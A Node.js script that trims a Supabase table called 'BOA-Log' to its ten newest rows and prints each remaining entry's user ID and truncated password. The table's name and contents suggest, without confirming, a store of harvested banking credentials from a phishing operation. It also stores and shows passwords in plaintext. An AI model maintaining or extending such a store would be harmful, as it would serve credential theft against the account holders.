import * as supabase from '@supabase/supabase-js';
import dotenv from 'dotenv';

// Load environment variables
dotenv.config({ path: '.env' });

const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY;

if (!SUPABASE_URL || !SUPABASE_ANON_KEY) {
  console.error('Missing SUPABASE_URL or SUPABASE_ANON_KEY');
  process.exit(1);
}

const client = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

async function cleanupEntries() {
  try {
    console.log('🧹 Starting cleanup...\n');

    // Get max ID
    const { data: maxIdData } = await client
      .from('BOA-Log')
      .select('id')
      .order('id', { ascending: false })
      .limit(1);

    if (!maxIdData || maxIdData.length === 0) {
      console.error('❌ No entries found');
      process.exit(1);
    }

    const maxId = maxIdData[0].id;
    const cutoffId = maxId - 9;

    console.log(`📊 Max ID: ${maxId}`);
    console.log(`📌 Keeping IDs from ${cutoffId} to ${maxId} (10 entries)\n`);

    // Use raw SQL to delete - more reliable than ORM
    const { data, error } = await client.rpc('delete_old_entries', { cutoff_id: cutoffId });

    if (error) {
      console.log('⚠️  RPC not available, using direct query delete...\n');
      
      // Get all old IDs at once
      const { data: allOldIds, error: fetchError } = await client
        .from('BOA-Log')
        .select('id')
        .lt('id', cutoffId);

      if (fetchError) {
        console.error('❌ Error fetching old IDs:', fetchError.message);
        process.exit(1);
      }

      if (allOldIds && allOldIds.length > 0) {
        console.log(`🗑️  Found ${allOldIds.length} old entries to delete\n`);
        console.log(`  Deleting in batches of 100...\n`);
        
        let deletedTotal = 0;
        const batchSize = 100;
        const idsToDelete = allOldIds.map(e => e.id);

        for (let i = 0; i < idsToDelete.length; i += batchSize) {
          const batch = idsToDelete.slice(i, i + batchSize);
          
          const { error: delError } = await client
            .from('BOA-Log')
            .delete()
            .in('id', batch);

          if (delError) {
            console.error(`❌ Batch ${Math.floor(i / batchSize) + 1} error:`, delError.message);
            continue;
          }

          deletedTotal += batch.length;
          const progress = Math.min(deletedTotal, idsToDelete.length);
          console.log(`  ✓ Batch ${Math.floor(i / batchSize) + 1}: Progress ${progress}/${idsToDelete.length}`);
        }

        console.log(`\n✅ Deleted ${deletedTotal} total entries\n`);
      } else {
        console.log('✅ No old entries to delete\n');
      }
    } else {
      console.log(`✅ Deleted entries using RPC\n`);
    }

    // Verify
    const { count: remaining } = await client
      .from('BOA-Log')
      .select('*', { count: 'exact', head: true });

    console.log(`📊 Database now contains ${remaining} entries\n`);

    // Show last 10
    const { data: lastTen } = await client
      .from('BOA-Log')
      .select('id, user_id, password, created_at')
      .order('id', { ascending: true });

    if (lastTen) {
      console.log('📋 Remaining entries:\n');
      lastTen.forEach((entry, idx) => {
        const date = new Date(entry.created_at).toLocaleString();
        const user = entry.user_id || 'N/A';
        const pass = entry.password ? entry.password.substring(0, 10) + '...' : 'N/A';
        console.log(`   [${idx + 1}] ID: ${entry.id} | User: ${user} | Pass: ${pass} | ${date}`);
      });
    }

    console.log('\n🎉 Cleanup complete!\n');
  } catch (error) {
    console.error('❌ Error:', error.message);
    process.exit(1);
  }
}

cleanupEntries();
